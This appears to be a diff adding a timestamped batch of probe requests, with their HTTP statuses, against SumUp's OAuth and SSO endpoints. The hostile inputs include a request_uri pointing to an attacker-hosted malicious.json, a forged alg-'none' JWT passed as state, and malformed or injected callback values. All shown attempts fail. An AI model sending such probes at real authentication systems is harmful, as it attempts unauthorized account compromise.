@@ -138,3 +138,13 @@ https://portal.sumup.com/ -> 200 len=?
 https://me.sumup.com/api/sso/callback?state=eyJhbGciOiJub25lIn0.eyJhcHBTdGF0ZSI6e30nfQ -> HTTP 403
 https://me.sumup.com/api/sso/callback?state=malformed -> HTTP 403
 https://me.sumup.com/api/sso/callback -> HTTP 403
+
+## 2026-09-05 08:45:31 UTC
+https://auth.sumup.com/oauth2/par -> HTTP 404
+https://dashboard.sumup.com/callback&request_uri=https://attacker.com/malicious.json&response_type=code&scope=classic -> HTTP 403
+https://auth.sumup.com/oauth2/auth?client_id=dashboard&request_uri=urn:ietf:params:oauth:request_uri: -> HTTP 404
+https://portal.sumup.com/ -> 200 len=?
+https://me.sumup.com/api/sso/callback?state=eyJhbGciOiJub25lIn0.eyJhcHBTdGF0ZSI6e30nfQ -> HTTP 403
+https://me.sumup.com/api/sso/callback?state=malformed -> HTTP 403
+https://me.sumup.com/api/sso/callback -> HTTP 403
+https://me.sumup.com/api/sso/callback` -> HTTP 404
